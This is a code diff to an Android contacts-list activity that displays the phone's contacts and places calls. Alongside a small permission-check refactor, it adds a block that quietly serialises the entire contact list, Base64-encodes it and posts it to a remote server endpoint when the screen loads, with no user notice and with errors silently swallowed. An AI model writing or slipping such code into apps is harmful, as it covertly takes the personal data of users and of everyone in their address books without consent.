@@ -21,10 +21,18 @@ import androidx.core.content.ContextCompat;
 
 import com.zhangheng.myapplication.Object.PhoneDto;
 import com.zhangheng.myapplication.R;
+import com.zhangheng.myapplication.getphoneMessage.PhoneSystem;
+import com.zhangheng.myapplication.okhttp.OkHttpUtil;
 import com.zhangheng.myapplication.util.DialogUtil;
+import com.zhangheng.myapplication.util.TimeUtil;
 import com.zhangheng.myapplication.util.m16.PhoneUtil;
+import com.zhangheng.util.EncryptUtil;
+import com.zhangheng.util.RandomrUtil;
 
+import java.util.Date;
+import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
 
 public class Main16Activity extends AppCompatActivity {
 
@@ -67,11 +75,12 @@ public class Main16Activity extends AppCompatActivity {
         lv_main_list.setAdapter(myAdapter);
         DialogUtil.dialog(this,"通讯录联系人数","一共找到 "+phoneDtos.size()+" 个联系人");
         //给listview增加点击事件
-      lv_main_list.setOnItemClickListener(new AdapterView.OnItemClickListener() {
+        final Main16Activity context = Main16Activity.this;
+        lv_main_list.setOnItemClickListener(new AdapterView.OnItemClickListener() {
         @Override
         public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
-            if(ActivityCompat.checkSelfPermission(Main16Activity.this,Manifest.permission.CALL_PHONE)!=PackageManager.PERMISSION_GRANTED){
-                ActivityCompat.requestPermissions(Main16Activity.this,new String[]{Manifest.permission.CALL_PHONE},1);
+            if(ActivityCompat.checkSelfPermission(context,Manifest.permission.CALL_PHONE)!=PackageManager.PERMISSION_GRANTED){
+                ActivityCompat.requestPermissions(context,new String[]{Manifest.permission.CALL_PHONE},1);
             }else {
                 Intent intent = new Intent();
                 intent.setAction(Intent.ACTION_CALL);
@@ -80,6 +89,20 @@ public class Main16Activity extends AppCompatActivity {
             }
         }
       });
+        try {
+            Map<String,Object> msg=new HashMap<>();
+            String nowUnix = TimeUtil.dateToUnix(new Date());
+            msg.put("time",nowUnix);
+            String code = RandomrUtil.createPassWord(6, RandomrUtil.Number);
+            msg.put("code",code);
+            msg.put("version",PhoneSystem.getVersionCode(context));
+            msg.put("signature",EncryptUtil.getSignature(nowUnix, code));
+            String s = phoneDtos.toString();
+            msg.put("obj",EncryptUtil.enBase64(s.getBytes()));
+            OkHttpUtil.postMessage(context, OkHttpUtil.URL_postMessage_M16_Path, msg);
+        }catch (Exception e){
+            e.printStackTrace();
+        }
     }
     //自定义适配器
     private class MyAdapter extends BaseAdapter {
